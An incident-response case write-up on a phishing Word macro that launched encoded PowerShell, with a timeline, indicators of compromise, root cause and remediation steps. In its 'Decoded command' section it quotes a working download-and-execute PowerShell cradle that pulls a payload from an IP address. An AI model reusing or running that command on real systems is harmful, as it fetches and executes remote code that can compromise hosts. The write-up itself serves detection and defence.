# Case 002: Encoded PowerShell from a malicious Word macro

**Case opened:** 2025-08-20 13:18 America/Los_Angeles (business hours)  
**Analyst:** Artem Khludov  
**Org (example):** EnergyLogic AI  
**Severity:** Critical  
**Status:** Closed same day — host clean, no exfiltration

## What happened

Finance got a spearphish with a `.docm`. The user enabled content. WinWord spawned PowerShell with `-enc`. The decoded line was classic download-cradle: pull a second stage over HTTP and execute. Firewall dropped the egress; EDR never let the payload run to completion. I still isolated the box and burned the session.

## Timeline (America/Los_Angeles, 2025-08-20)

| Time | Event |
|------|--------|
| 13:18:00 | Message delivered to finance mailbox |
| 13:21:30 | Document opened, macros enabled |
| 13:21:35 | Encoded PowerShell launched |
| 13:21:40 | Outbound HTTP to staging IP blocked |
| 13:24:00 | EDR alert hit my queue |
| 13:26:00 | Workstation isolated |
| 13:41:00 | Clean scan, macro removed, user rotated |

## Decoded command (what mattered)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.241.218.132/payload.exe')
```

## IOC

- Staging IP: `192.241.218.132`  
- Sender lookalike: `invoice@accounting-services[.]com`  
- Attachment: `Invoice_September.docm`  
- Parent chain: `WINWORD.EXE` → `powershell.exe` with `-enc` / long command line

## Root cause

Human click plus macro execution on a class of attachment we still allowed, plus PowerShell not constrained on that profile.

## What I pushed in the fix ticket

Block high-risk macro formats at the gateway, turn on constrained language where the business accepts it, and run another phishing drill for finance with harsher scoring.

_Last edit: 2025-08-20_
